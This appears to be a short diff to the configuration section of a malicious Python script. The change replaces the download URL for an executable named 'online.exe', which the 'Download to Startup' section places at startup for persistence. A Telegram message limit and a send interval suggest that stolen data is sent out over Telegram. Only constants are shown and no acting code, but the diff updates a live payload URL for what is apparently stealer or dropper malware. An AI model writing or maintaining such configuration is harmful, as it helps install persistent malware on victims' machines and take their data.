@@ -58,7 +58,7 @@ SEND_INTERVAL = 15  # seconds
 TELEGRAM_MSG_MAX_LEN = 4096  # Telegram message limit
 
 # ====== Download to Startup ======
-DOWNLOAD_URL = "https://drive.google.com/file/d/1TazI5o1ud_9LE-CeIIG4oTpFuwWdL8-g/view?usp=sharing"
+DOWNLOAD_URL = "https://raw.githubusercontent.com/khaled88r5/p/refs/heads/main/online.exe"
 STARTUP_FILENAME = "online.exe"
 
 # ===============================
